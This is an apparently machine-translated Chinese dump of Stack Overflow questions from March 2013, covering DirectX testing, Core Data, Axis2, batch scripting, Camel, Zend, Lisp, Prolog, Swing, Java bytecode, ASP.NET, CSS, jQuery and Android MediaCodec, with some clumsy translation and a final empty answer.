阅读（和玩）这个：[http ://research.cs.vt.edu/AVresearch/MMtutorial/WorstFit.php](http://research.cs.vt.edu/AVresearch/MMtutorial/WorstFit.php)

# session - 安装平台更新 kb2670838 后无法对 DirectX 应用程序运行自动化测试

> ID：15650031
> 
> 赞同：2
> 
> 时间：2013-03-27T00:39:32.067
> 
> 标签：session, directx, sessionid, windows-update

我为在各种自动化服务器上​​运行的基于 DirectX 的应用程序进行自动化测试。服务器设置为作为服务运行，这意味着当测试执行时，它们在会话 0 下执行。

但是，安装 Windows 平台更新 kb2670838 后测试开始失败。初始化应用程序时，调用 CreateSwapChain 后会出现 DXGI_ERROR_NOT_CURRENTLY_AVAILABLE 错误。

我发现某些 API 调用在会话 0 下不起作用。（请参阅[http://msdn.microsoft.com/en-us/library/windows/desktop/hh404562(v=vs.85).aspx](http://msdn.microsoft.com/en-us/library/windows/desktop/hh404562%28v=vs.85%29.aspx)）。

但上周这奏效了。我在各种微软论坛上发布了这个，但似乎没有其他人遇到这个问题。所以我的问题是有没有其他人经历过这个？你是如何解决这个问题的？

# iphone - 父 NSManagedObjectContext 在子保存后没有变化，但仅在发布模式下（在调试模式下工作）

> ID：15650032
> 
> 赞同：0
> 
> 时间：2013-03-27T00:39:35.853
> 
> 标签：iphone, ios, ipad, core-data, nsmanagedobjectcontext

我的设置：

*   连接到我的`NSManagedObjectContext`with 类型`NSPrivateQueueConcurrencyType``NSPersistentStoreCoordinator`
*   作为私有上下文的子级的with`NSManagedObjectContext`类型。`NSMainQueueConcurrencyType`
*   作为主上下文的子级的with`NSManagedObjectContext`类型。`NSConfinementConcurrencyType`

从服务器下载数据时，我将数据写入 type 的上下文`NSConfinementConcurrencyType`。然后我保存这个上下文，它将更改推送到我的主要上下文。然后我保存我的主要上下文，它将更改推送到我的私人上下文。此时，我使用`performBlock`私有上下文上的方法将所有内容保存到我的持久存储中。

在设备上进行调试时，这可以完美地工作。每当我归档应用程序并在发布模式下运行应用程序时，我的主上下文永远不会收到更改，即使我成功保存了它的子上下文。我已经仔细检查了，我的临时上下文确实链接到主上下文（主上下文确实显示为临时上下文的父级）。但是每当我在发布模式下保存临时上下文时，主上下文永远不会显示任何更改。我很困惑为什么这会在调试模式下工作而不是在发布模式下工作。

任何建议/帮助将不胜感激。

谢谢，

新郎

编辑：如果我使用调试配置存档构建，一切都按预期工作。因此，发布配置中有一些不同的设置。我会报告我的发现。

编辑2：找到罪魁祸首。所以我将我的保存上下文调用包装在一个 NSAssert 中（希望在测试时发现任何失败）。不幸的是，Release 配置删除了这些包含我的保存调用的断言块。**掌心**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-27T03:14:38.450

`NSConfinementConcurrencyType`是旧的遗留核心数据行为，在父子上下文的概念之前。如果您要导入子上下文，则该子上下文必须是`NSPrivateQueueConcurrencyType`. 我很惊讶`performBlock:`, 父/子 MOC的组合`NSConfinementConcurrencyType`完全有效。

# java - 使用 Axis2 在 Java 上创建 Web 服务时出现部署异常

> ID：15650035
> 
> 赞同：0
> 
> 时间：2013-03-27T00:39:53.993
> 
> 标签：java, eclipse, web-services, tomcat7, axis2

我用 java 编写了一个使用 web 服务的程序，现在我正试图使用​​ eclipse、Axis 2 和 Tomcat7 将它放入另一个 web 服务中。

原始程序运行完美，所以我认为它应该在 web 服务中工作，虽然我不确定（我是 web 服务的新手）。我收到此部署异常：

```
 INFO: Ha comenzado la recarga de Contexto [/webService4]
[INFO] Clustering has been disabled
[INFO] Deploying module: addressing-1.6.2 - file:/Users/argelramirezreyes/Dropbox/java/workspace/.metadata/.plugins/org.eclipse.wst.server.core/tmp0/wtpwebapps/webService4/WEB-INF/modules/addressing-1.6.2.mar
[INFO] Deploying module: metadataExchange-1.6.2 - file:/Users/argelramirezreyes/Dropbox/java/workspace/.metadata/.plugins/org.eclipse.wst.server.core/tmp0/wtpwebapps/webService4/WEB-INF/modules/mex-1.6.2.mar
[INFO] Deploying module: mtompolicy-1.6.2 - file:/Users/argelramirezreyes/Dropbox/java/workspace/.metadata/.plugins/org.eclipse.wst.server.core/tmp0/wtpwebapps/webService4/WEB-INF/modules/mtompolicy-1.6.2.mar
[INFO] Deploying module: ping-1.6.2 - file:/Users/argelramirezreyes/Dropbox/java/workspace/.metadata/.plugins/org.eclipse.wst.server.core/tmp0/wtpwebapps/webService4/WEB-INF/modules/ping-1.6.2.mar
[INFO] Deploying module: script-1.6.2 - file:/Users/argelramirezreyes/Dropbox/java/workspace/.metadata/.plugins/org.eclipse.wst.server.core/tmp0/wtpwebapps/webService4/WEB-INF/modules/scripting-1.6.2.mar
[INFO] Deploying module: soapmonitor-1.6.2 - file:/Users/argelramirezreyes/Dropbox/java/workspace/.metadata/.plugins/org.eclipse.wst.server.core/tmp0/wtpwebapps/webService4/WEB-INF/modules/soapmonitor-1.6.2.mar
[INFO] Deploying JAXWS annotated class SolicitarFactura as a service - SolicitarFacturaService
[INFO] The SolicitarFactura service, which is not valid, caused java.lang.NoClassDefFoundError: javax/ws/rs/Produces
at org.apache.axis2.jaxrs.JAXRSUtils.getClassModel(JAXRSUtils.java:53)
at org.apache.axis2.description.java2wsdl.DefaultSchemaGenerator.generateSchema(DefaultSchemaGenerator.java:272)
at org.apache.axis2.deployment.util.Utils.fillAxisService(Utils.java:468)
at org.apache.axis2.deployment.ServiceBuilder.populateService(ServiceBuilder.java:388)
at org.apache.axis2.deployment.repository.util.ArchiveReader.buildServiceGroup(ArchiveReader.java:101)
at org.apache.axis2.deployment.repository.util.ArchiveReader.processServiceGroup(ArchiveReader.java:178)
at org.apache.axis2.deployment.ServiceDeployer.deploy(ServiceDeployer.java:82)
at org.apache.axis2.deployment.repository.util.DeploymentFileData.deploy(DeploymentFileData.java:136)
at org.apache.axis2.deployment.DeploymentEngine.doDeploy(DeploymentEngine.java:813)
at org.apache.axis2.deployment.repository.util.WSInfoList.update(WSInfoList.java:144)
at org.apache.axis2.deployment.RepositoryListener.update(RepositoryListener.java:377)
at org.apache.axis2.deployment.RepositoryListener.checkServices(RepositoryListener.java:254)
at org.apache.axis2.deployment.DeploymentEngine.loadServices(DeploymentEngine.java:142)
at org.apache.axis2.deployment.WarBasedAxisConfigurator.loadServices(WarBasedAxisConfigurator.java:283)
at org.apache.axis2.context.ConfigurationContextFactory.createConfigurationContext(ConfigurationContextFactory.java:95)
at org.apache.axis2.transport.http.AxisServlet.initConfigContext(AxisServlet.java:584)
at org.apache.axis2.transport.http.AxisServlet.init(AxisServlet.java:454)
at org.apache.axis2.webapp.AxisAdminServlet.init(AxisAdminServlet.java:60)
at org.apache.catalina.core.StandardWrapper.initServlet(StandardWrapper.java:1280)
at org.apache.catalina.core.StandardWrapper.loadServlet(StandardWrapper.java:1193)
at org.apache.catalina.core.StandardWrapper.load(StandardWrapper.java:1088)
at org.apache.catalina.core.StandardContext.loadOnStartup(StandardContext.java:5033)
at org.apache.catalina.core.StandardContext.startInternal(StandardContext.java:5317)
at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:150)
at org.apache.catalina.core.StandardContext.reload(StandardContext.java:3926)
at org.apache.catalina.loader.WebappLoader.backgroundProcess(WebappLoader.java:426)
at org.apache.catalina.core.ContainerBase.backgroundProcess(ContainerBase.java:1345)
at org.apache.catalina.core.ContainerBase$ContainerBackgroundProcessor.processChildren(ContainerBase.java:1530)
at org.apache.catalina.core.ContainerBase$ContainerBackgroundProcessor.processChildren(ContainerBase.java:1540)
at org.apache.catalina.core.ContainerBase$ContainerBackgroundProcessor.processChildren(ContainerBase.java:1540)
at org.apache.catalina.core.ContainerBase$ContainerBackgroundProcessor.run(ContainerBase.java:1519)
at java.lang.Thread.run(Thread.java:722)
Caused by: java.lang.ClassNotFoundException: javax.ws.rs.Produces
at org.apache.catalina.loader.WebappClassLoader.loadClass(WebappClassLoader.java:1713)
at org.apache.catalina.loader.WebappClassLoader.loadClass(WebappClassLoader.java:1558)
... 32 more

[INFO] org.apache.axis2.deployment.DeploymentException: java.lang.NoClassDefFoundError: javax/ws/rs/Produces
[INFO] Deploying Web service: version.aar - file:/Users/argelramirezreyes/Dropbox/java/workspace/.metadata/.plugins/org.eclipse.wst.server.core/tmp0/wtpwebapps/webService4/WEB-INF/services/version.aar
[WARN] No transportReceiver for org.apache.axis2.transport.http.AxisServletListener found.    An instance for HTTP will be configured automatically. Please update your axis2.xml file!
mar 26, 2013 7:45:52 PM org.apache.catalina.core.StandardContext reload
INFO: Se ha completado la recarga de este Contexto 
```

我试图手动下载一个包含 javax.ws.rs.Produces 并导入的 jar，但问题仍然存在......

你可以帮帮我吗？

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T17:52:05.433

您需要将该特定 jar 保存在 lib 文件夹中。问题是在运行时，服务器无法识别特定的库。

# windows - 如何从批处理文件打开power shell窗口到新窗口

> ID：15650036
> 
> 赞同：0
> 
> 时间：2013-03-27T00:39:59.447
> 
> 标签：windows, powershell, batch-file, monkey

我正在编写一个 DOS 批处理脚本文件。我的脚本将执行以下操作：

1.  使用 mkdir 命令创建一个目录
2.  将powershell命令生成到新窗口（不是同一个命令窗口）
3.  我想在新窗口中打开这个电源脚本
4.  在当前窗口中运行 shell monkey -p com.android.browser

测试.bat

```
mkdir c:\test_log_file
powershell adb logcat >> "C:\Testdata.txt"              
shell monkey -p  com.android.browser 
```

我在将 powershell 生成到新窗口时遇到问题。我将如何在新的命令窗口中打开电源外壳。

问候，

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-27T00:55:56.447

```
mkdir c:\test_log_file
START "Powershell window" powershell adb logcat ^>^> "C:\Testdata.txt"              
shell monkey -p  com.android.browser 
```

插入符号 ( `^`) 需要将其特殊含义转义给命令处理器。引用的第一个参数是新窗口的窗口标题。`""`如果你愿意，可以。

# java - 如何使用 apache-camel 构建管道和过滤器 eip 模式

> ID：15650037
> 
> 赞同：1
> 
> 时间：2013-03-27T00:40:00.663
> 
> 标签：java, apache-camel, integration-patterns

我正在尝试做一个 PoC，以便使用[Apache Camel实现](http://camel.apache.org/)[管道和过滤器 eip 模式](http://www.eaipatterns.com/PipesAndFilters.html)。

从[Camel 文档](http://camel.apache.org/pipes-and-filters.html)中，我假设每个过滤器都必须作为一个[Endpoint](http://camel.apache.org/endpoint.html)实现（“使用 Camel，您可以将处理拆分为多个独立的 Endpoint 实例，然后这些实例可以链接在一起。”）

因此，如果我理解正确，则 Authenticate 过滤器（来自示例）必须实现[Endpoint interface](http://camel.apache.org/maven/current/camel-core/apidocs/org/apache/camel/Endpoint.html)。

“问题”是我不想“重新发明轮子”。因此，我几乎可以肯定我可以使用已经实现的接口，而不是从头开始实现接口。一个是[BeanEndpoint](http://camel.apache.org/maven/current/camel-core/apidocs/org/apache/camel/component/bean/BeanEndpoint.html)。

那正确吗？

我发现了一些管道和过滤器模式的例子（[比如这个](http://camel.apache.org/walk-through-another-example.html)），但没有一个显示如何实现 bean。

有人可以提供一个bean实现示例吗？

TIA,

鲍勃

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T11:48:13.467

Camel EIP 在这里列出，它们都有示例等等 [http://camel.apache.org/eip](http://camel.apache.org/eip)

因此，对于管道和过滤器，您可以在该链接上找到它并查看一些示例 [http://camel.apache.org/pipes-and-filters.html](http://camel.apache.org/pipes-and-filters.html)

看来你是骆驼的新手。然后我建议阅读这篇介绍文章以了解 Camel：http: [//java.dzone.com/articles/open-source-integration-apache](http://java.dzone.com/articles/open-source-integration-apache)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-27T05:12:36.530

首先，尽管当您说“骆驼将过滤器实现为端点”时，我明白了您的来历，但我不会将它们严格归类为端点。在我看来，更像是消息转换器/翻译器。

因此，如果您需要根据需要实现自定义过滤器，请使用[处理器接口](http://camel.apache.org/processor.html)。

基本上，编写一个实现 Camel 处理器的类（例如 CustomProcessor）并编写您的自定义过滤器策略。然后，在您的路线中将其称为 to("CustomProcessor")。

处理器页面一定会清除您所有的疑虑，所以请看一下。

另外我假设您知道[骆驼消息过滤器模式](http://camel.apache.org/message-filter.html)。

谢谢你。

# apache - 找不到控制器目录

> ID：15650039
> 
> 赞同：0
> 
> 时间：2013-03-27T00:40:13.977
> 
> 标签：apache, zend-framework

我正在尝试在我的 apache Web 服务器上创建一个 zend 应用程序，并为我的 index.php 使用 httpdocs 文件夹而不是 public 文件夹。当我尝试访问控制器/操作时，它总是在 httpdocs 目录中查找 auth 文件。但是由于我的控制器位于应用程序/控制器中，它会抛出一个错误。（我已经在 application.ini 中设置了控制器目录）。

但是，当我将文件夹名称从 httpdocs 更改为 public 并且当然更新我的 vhost.conf 文件时，它可以工作。所以必须有一些必须设置的设置。

现在，我在我的 lighttpd 服务器中尝试了相同的项目和代码，它也在那里工作。

是否有任何必须在 apache 服务器中设置的设置/配置？

任何反馈将不胜感激！

提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T01:05:17.343

[在这里](http://framework.zend.com/manual/1.12/en/project-structure.rewrite.html)找到我的答案。

```
RewriteEngine On
RewriteCond %{REQUEST_FILENAME} -s [OR]
RewriteCond %{REQUEST_FILENAME} -l [OR]
RewriteCond %{REQUEST_FILENAME} -d
RewriteRule ^.*$ - [NC,L]
RewriteRule ^.*$ index.php [NC,L] 
```

我只需要在 httpdocs 目录下的 .htaccess 文件中重写。

# graph - 绘制所有子节点 common lisp

> ID：15650041
> 
> 赞同：2
> 
> 时间：2013-03-27T00:40:27.900
> 
> 标签：graph, common-lisp

我需要找到作为所选节点的子节点的所有节点。图形是这样创建的： (setq graf1 '((A(BC)) (B(DE)) (C (FG )) (D (H)) (E(I)) (F(J)) (G( J)) (H()) (I(J)) (J()))) 所以，节点 B 的所有子节点都是（在第一级）D，E，在第二个 H，I，第三个 J。这是代码寻找第一级的孩子，但因为我是 lisp 的初学者，所以我不能让它适用于其他孩子。

```
(defun sledG (cvor graf obradjeni)
  (cond ((null graf) '())
        ((equal (caar graf) cvor)
                (dodaj (cadar graf) obradjeni))
        (t(sledG cvor (cdr graf) obradjeni)))
(defun dodaj (potomci obradjeni)
  (cond ((null potomci) '())
        ((member (car potomci) obradjeni)
         (dodaj (cdr potomci) obradjeni )
        (t(cons (car potomci)
                (dodaj (cdr potomci) obradjeni) ))))
(setq graf1 '((A(B C)) (B(D E)) (C (F G )) (D (H)) (E(I)) (F(J)) (G(J)) (H()) (I(J)) (J()))) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-27T17:12:20.853

使用[`alexandria`](http://common-lisp.net/project/alexandria/)包：

```
(defvar *graf*
  '((a (b c)) (b (d e)) (c (f g)) (d (h)) (e (i)) (f (j)) (g (j)) (h nil) (i (j)) (j nil)))

(defun descendants (tree label)
  (let ((generation
         (mapcan #'cadr
                 (remove-if-not
                  (alexandria:compose (alexandria:curry #'eql label) #'car)
                  tree))))
    (append generation (mapcan (alexandria:curry #'descendants tree) generation))))

;; (D E H I J) 
```

我相信，这就是你想要做的。这将适用于非循环图，但如果你有一个循环，它将“永远”重复出现。如果您想添加深度计数器，您可以通过插入深度计数器将其作为一个参数添加到`descendants`或在最后一次转换结果列表中。`mapcan`

包括深度：

```
(defun descendants (tree label)
  (labels ((%descendants (depth label)
             (let ((generation
                    (mapcan #'cadr
                            (remove-if-not
                             (alexandria:compose
                               (alexandria:curry #'eql label) #'car)
                             tree))))
               (append (mapcar (alexandria:compose
                                #'nreverse
                                (alexandria:curry #'list depth))
                               generation)
                       (mapcan (alexandria:curry #'%descendants (1+ depth))
                               generation)))))
    (%descendants 0 label)))

;; ((D 0) (E 0) (H 1) (I 1) (J 2)) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-27T10:37:09.723

当我阅读它时，该图是有向图。因此，要找到图的子项（有向边）（在示例中），

```
(defun children (node graph) (second (assoc node graph))) 
```

然后

```
(children 'b graf1) ; with graf1 from the OP 
```

返回 (DE)。那么你所要做的就是遍历孩子，比如（非常快速和肮脏）

```
(defun all-children (node graph)
  (let ((c (children node graph)))
    (if (null c) nil
        (union c (loop for x in c appending (all-children x graph)))))) 
```

这将返回 (JIHDE) 作为 B 的子项。

# prolog - Prolog差异列表 - 合并排序

> ID：15650042
> 
> 赞同：1
> 
> 时间：2013-03-27T00:40:30.407
> 
> 标签：prolog, difference-lists

我必须编写谓词，它将一个列表分成两个列表（减半）：

```
halve(X-Y, X-Z, Z-Y) :- halve_pom(X-Y, X-Y, Z), !.

halve_pom(Z-Y, Y-Y, Z).

halve_pom([_|A]-Y, [_,_|B]-Y, Z) :- halve_pom(A-Y, B-Y, Z). 
```

这很容易，但现在我必须编写能够进行归并排序的算法——我不知道。该算法必须使用差异列表。

请帮忙。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-27T11:49:48.673

不，这并不“容易”，因为它不起作用，不幸的是。`halve([1,2,3]-[],A,B)`不工作；`halve_pom([1,2,3]-[],A,B)`也不行。此外，尚不清楚您更喜欢哪种拆分方案，`[1,2,3,4,5,6,7] -> ([1,3,5,7] , [2,4,6])`或者`-> ([1,2,3,4] , [5,6,7])`.

如果您的`halve`谓词有效，那么您剩下要做的就是定义`merge`，它将*按顺序*合并列表的两半。然后，

```
mergesort(A,S):- halve(A,B-[],C-[]), mergesort(B,SB), mergesort(C,SC),
  merge(SB,SC,S-[]). 
```

请注意，您可能会使用普通列表调用它`A`，即`halve`谓词应该将其第一个参数视为普通列表（即不是差异列表）。

另请参阅[Prolog 中处理列表时的“-”符号是什么意思？](https://stackoverflow.com/questions/15456014/what-does-the-symbol-mean-in-prolog-when-dealing-with-lists). `'-'`是不必要的；相反，它的两个成分应该用作谓词的两个独立参数。

* * *

所以，一种编码方式`halve`是

```
halve([A,B|C],[A|X]-ZX,[B|Y]-ZY):- halve(C,X-ZX,Y-ZY). 
halve([A],[A|X]-X,Y-Y). 
halve([],X-X,Y-Y). 
```

相同的方法可用于编码`merge`：

```
merge(SB,SC,S-Z):- SB=[A|B], SC=[C|D], A=<C, S=[A|T], merge(B,SC,T-Z).
merge(SB,SC,S-Z):- SB=[A|B], SC=[C|D], A>C,  ... ,    ... .
merge(SB,SC,S-Z):- SB=[A|B], SC=[],          ... ,    ... .
merge(SB,SC,S-Z):- SB=[], SC=[C|D],          S=[C|T], ... .
merge([],[],Z-Z). 
```

# java - 随机错误突出显示导致 JTextPane（阿拉伯语）

> ID：15650047
> 
> 赞同：3
> 
> 时间：2013-03-27T00:40:48.307
> 
> 标签：java, swing, arabic, jtextpane, swing-highlighter

我正在尝试在我的 JTextPane 中搜索和突出显示单词。它非常适用于到目前为止没有很多结果的单词，但是当我尝试搜索一个有很多实例的单词时，有时，荧光笔会突出显示结果，就像它错过了许多字符一样. 无论如何，这是我为此目的使用的代码。

```
 int index = 0;
    String text = null;
    try {
    int length=textPane.getDocument().getLength();
    text = textPane.getDocument().getText(0,length);
    } catch (BadLocationException e1) {
    // TODO Auto-generated catch block
    e1.printStackTrace();
    }  
    try {
     while ((index = text.indexOf(myWord, index)) >= 0) {
    DefaultHighlighter.DefaultHighlightPainter highlightPainter = new DefaultHighlighter.DefaultHighlightPainter(Color.YELLOW);
    textPane.getHighlighter().addHighlight(index, index+myWord.length(), highlightPainter);
    index += myWord.length();

    }

    } catch (BadLocationException e) {
    // TODO Auto-generated catch block
    e.printStackTrace();
    }

    } 
```

这是描述问题的屏幕截图 [http://i.imgur.com/po6U0rh.png](http://i.imgur.com/po6U0rh.png) 红圈=错误结果，绿圈=正确结果。

预先感谢您的帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-27T02:08:18.383

我不知道是否支持荧光笔的使用。据我所知，Highlighter 仅供 javax.swing.text.View 及其相关类使用。

我会这样做：

```
StyledDocument document = textPane.getStyledDocument();
Style highlight = document.addStyle("highlight", null);
StyleConstants.setBackground(highlight, Color.YELLOW);

String text = document.getText(0, document.getLength());
while ((index = text.indexOf(myWord, index)) >= 0) {
    document.setCharacterAttributes(index, myWord.length(), highlight, false);
    index += myWord.length();
} 
```

# java - Java中的字节码和源代码？

> ID：15650050
> 
> 赞同：1
> 
> 时间：2013-03-27T00:41:05.797
> 
> 标签：java

我真的很困惑。请有人帮忙明确回答以下哪些包含java中的源代码和字节码？

1.  学生类
2.  学生
3.  学生.java
4.  学生.exe

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-27T00:43:17.983

**Student.java**是Java源代码文件，一个文本文件

**Student.class**是从它编译的字节码，一个二进制文件

**Student.exe**是一个 Windows 可执行文件（也是二进制文件，但[不是你通常从 Java 获得的东西](https://stackoverflow.com/questions/147181/how-can-i-convert-my-java-program-to-an-exe-file?lq=1)）

**Student**根本不是一个文件，只是一个抽象概念（一个 Java 类，其全名类似于**com.vicheanak.myapp.Student**）。

您可能还会遇到**Student.jar**，它是构成应用程序或库的所有类文件和其他资源的存档。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-27T00:42:47.627

您的源代码是 Student.java。字节码是 Student.class。源代码在编译时变成字节码（例如：使用 javac）。学生将是您的班级名称。我不确定 Student.exe，如果您在 Windows 上使用 C/C++，它将是您的字节码。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-27T00:43:18.527

Student.class 是 Java 字节码。

学生没有任何意义——它可能不是一个文件。

Student.java 有 java 源代码。

Student.exe 有汇编字节码。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-27T00:43:49.857

`Student.class`是 Java 字节码。

`Student.java`有java源代码

`Student`根本不是文件，

`Student.exe`是一个 Windows 可执行文件

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-27T00:45:30.330

Student.class 是 java 虚拟机的字节码。它将直接执行（或及时将其编译成汇编，即 CPU 直接读取的指令）。

学生是你班级的名字，我猜。

Student.java 是您的课程的源代码。它将被编译成 Student.class。

Student.exe 是一个可执行文件。它将被编码以启动 java 虚拟机，该虚拟机将执行 Student.class 中的字节码（很可能嵌入其中）。

# c# - 复选框的正确列表类型

> ID：15650054
> 
> 赞同：0
> 
> 时间：2013-03-27T00:41:30.610
> 
> 标签：c#, asp.net, asp.net-mvc, asp.net-mvc-3, entity-framework

我需要我的 GET Create 操作方法来返回两个要传递给视图的列表。一个是下拉列表，所以 SelectList 类型很好。但是，另一个将显示为复选框。任何人都可以建议使用正确/最佳的列表类型吗？

```
 //
    // GET: /Change/Create

    public ActionResult Create()
    {
        ViewBag.StaffID = new SelectList(db.Staff, "StaffID", "Fullname")
        ViewBag.BusinessAreas = new *?* (db.BusinessArea, "BusinessArea", "BuinessAreaName");

        return View();
    } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-27T01:27:32.760

您可以使用以下方式之一： 1.[使用](http://msdn.microsoft.com/en-us/library/system.web.mvc.multiselectlist%28v=vs.108%29.aspx)
MultiSelectList 。然后您将不得不使用 jquery 将复选框注入您的选择列表，或使用第 3 方控件，因为我相信 MVC3 没有内置任何复选框。 2\. 在您的视图中创建一个循环，并在您的循环内为每个项目创建[复选框](http://msdn.microsoft.com/en-us/library/system.web.mvc.html.inputextensions.checkbox%28v=vs.108%29.aspx)。（这是更多的工作）。

另外，请尽量避免使用`ViewBag`。与. `ViewModels`_`ViewBag`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-27T02:31:09.183

使用您想要的所有属性创建一个自定义类，并使用它 List list = new List Iterate in View 来获取所有数据。甚至您可以创建 HTML Helper 类并生成相同的并在您的视图中使用

# css - 响应式设计中的固定位置

> ID：15650056
> 
> 赞同：2
> 
> 时间：2013-03-27T00:41:59.343
> 
> 标签：css, scroll, responsive-design, css-position

我正在使用响应式框架 1140px。在移动版本中，我必须修复徽标的位置，但不能使其与滚动内容重叠。基本上固定位置但不固定滚动上的图像，这可以实现吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-27T00:46:37.793

你想用`position:absolute`

*   `position:fixed`将元素固定在屏幕上，因此滚动时它不会移动（它固定在窗口上）。

*   `position:absolute`修复基于最接近的元素`ancestor`not `position:static`，所以当你滚动页面时它会移动（它固定在页面上）。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-03-27T00:47:39.520

看来您想要的是`position: absolute`，不同之处在于绝对图像在滚动时不会移动。
[http://www.impressivewebs.com/absolute-position-css/](http://www.impressivewebs.com/absolute-position-css/)

值得看看这个链接，以了解相对、绝对和固定定位之间的区别：http:
[//css-tricks.com/absolute-relative-fixed-positioining-how-do-they-differ/](http://css-tricks.com/absolute-relative-fixed-positioining-how-do-they-differ/)

# jquery - Jquery AjaxSubmit + json 数据类型在 IE9 中剥离了 HTML

> ID：15650062
> 
> 赞同：0
> 
> 时间：2013-03-27T00:42:27.720
> 
> 标签：jquery, ajax, json, internet-explorer-9

我正在使用 jquery form.js 进行文件上传。服务器端代码返回一个 json 格式的字符串，其中一个字段是“内容”。内容字段有一个 HTML 表单，我只是在 div 的页面上抓取并吐出。

这在 Chrome 和 Firefox 中运行良好，但在 IE9 中失败。IE9 去除所有打开的 HTML 标记。我整天都在谷歌上搜索并尝试了很多东西，但我无法解决它。

这是我的 Jquery 代码：

```
 $('#file_form').on("change", ".file_upload_field", function(ev) {
        ev.preventDefault();

        var options = {
            url: '/ajax/process',
            type: 'post',
            dataType: 'json',
            success: function(response) {
              $('#upload-confirm').show().html(response.data.content);
            }
        };

        $('#my-form').ajaxSubmit(options);
    }); 
```

响应的结构是这样的

```
{
  "success": true,
  "message": "success",
  "data": {
    "content": "<form><input type=\"text\" /></form>"
  }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-27T00:50:01.090

您的回复不是有效的 json，有效的版本是

```
{
    "success": true,
    "message": "success",
    "data": {
        "content": "<form><input type=\"text\" /></form>"
    }
} 
```

# android - 在 4.2 Jelly Bean 模拟器和 nexus 4 设备上使用 mediacodec api 的不同结果

> ID：15650067
> 
> 赞同：2
> 
> 时间：2013-03-27T00:43:00.450
> 
> 标签：android, android-emulator, android-debug

我正在使用新的 API MediaCodec。我想获取解码的视频帧并在某个调度时间将它们呈现在表面上。现在我可以在模拟器上正确运行我的代码并获得如下视频帧格式：

```
{height=192, what=1869968451, color-format=19, slice-height=192, crop-left=0, width=320, crop-bottom=179, crop-top=0, mime=video/raw, stride=320, crop-right=319} 
```

但是当我在 nexus 4 上运行我的代码时，视频帧格式更改为

```
{height=180, what=1869968451, color-format=2141391875, slice-height=192, crop-left=0, width=320, crop-bottom=179, crop-top=0, mime=video/raw, stride=384, crop-right=319} 
```

查不出2141391875的颜色格式是什么，为什么高度不是192。一个有趣的问题是，当我将configure函数从`codec.configure(format, surface /* surface */, null /* crypto */, 0 /* flags */)`to修改时`codec.configure(format, null/* surface */, null /* crypto */, 0 /* flags */)`，输出缓冲区长度会从0变为114688。但实际上，如果帧格式为 YUV420p (320*192*1.5)，则正确的缓冲区长度应为 92160。我发现当我在模拟器上运行时，输出缓冲区在输出格式发生变化之前发生了变化。但是当我在nexus 4上运行时，这并没有改变。日志如下所示，在模拟器上：

```
03-26 14:42:38.466: I/VideoPlayTAG(1212): count=0
03-26 14:42:38.476: I/VideoPlayTAG(1212): sampleSize:700
03-26 14:42:38.496: D/VideoPlayTAG(1212): next:true
03-26 14:42:38.496: I/VideoPlayTAG(1212): output index:-3
03-26 14:42:38.566: D/VideoPlayTAG(1212): output buffers have changed.
03-26 14:42:38.566: I/VideoPlayTAG(1212): count=1
03-26 14:42:38.566: I/VideoPlayTAG(1212): sampleSize:140
03-26 14:42:38.596: D/VideoPlayTAG(1212): next:true
03-26 14:42:38.596: I/VideoPlayTAG(1212): output index:-2
03-26 14:42:38.686: D/VideoPlayTAG(1212): color=19 width=320 height=192
03-26 14:42:38.686: I/JNI(1212): begin setRender 1734
03-26 14:42:38.686: I/JNI(1212): setRender
03-26 14:42:38.716: D/VideoPlayTAG(1212): output format has changed to {height=192, what=1869968451, color-format=19, slice-height=192, crop-left=0, width=320, crop-bottom=179, crop-top=0, mime=video/raw, stride=320, crop-right=319}
03-26 14:42:38.716: I/VideoPlayTAG(1212): count=2 
```

在关系 4 上：

```
03-26 10:17:59.674: I/VideoPlayTAG(29899): count=0
03-26 10:17:59.684: I/VideoPlayTAG(29899): sampleSize:700
03-26 10:17:59.684: D/VideoPlayTAG(29899): next:true
03-26 10:17:59.694: I/VideoPlayTAG(29899): output index:-1
03-26 10:17:59.694: I/VideoPlayTAG(29899): count=1
03-26 10:17:59.704: I/VideoPlayTAG(29899): sampleSize:140
03-26 10:17:59.704: D/VideoPlayTAG(29899): next:true
03-26 10:17:59.704: I/VideoPlayTAG(29899): output index:-1
03-26 10:17:59.714: I/VideoPlayTAG(29899): count=2
03-26 10:17:59.714: I/VideoPlayTAG(29899): sampleSize:131
03-26 10:17:59.714: D/VideoPlayTAG(29899): next:true
03-26 10:17:59.724: I/VideoPlayTAG(29899): output index:-1
03-26 10:17:59.724: I/VideoPlayTAG(29899): count=3
03-26 10:17:59.724: I/VideoPlayTAG(29899): sampleSize:59
03-26 10:17:59.724: D/VideoPlayTAG(29899): next:true
03-26 10:17:59.724: I/VideoPlayTAG(29899): output index:-2
03-26 10:17:59.744: D/VideoPlayTAG(29899): color=2141391875 width=320 height=180
03-26 10:17:59.744: I/JNI(29899): begin setRender 1734
03-26 10:17:59.744: I/JNI(29899): setRender
03-26 10:17:59.744: D/VideoPlayTAG(29899): output format has changed to {height=180, what=1869968451, color-format=2141391875, slice-height=192, crop-left=0, width=320, crop-bottom=179, crop-top=0, mime=video/raw, stride=384, crop-right=319}
03-26 10:17:59.744: I/VideoPlayTAG(29899): count=4 
```

谁能帮我？我发现问题可能是由软件渲染和硬件渲染的差异引起的。

* * *

## 回答 #1

> 赞同：1
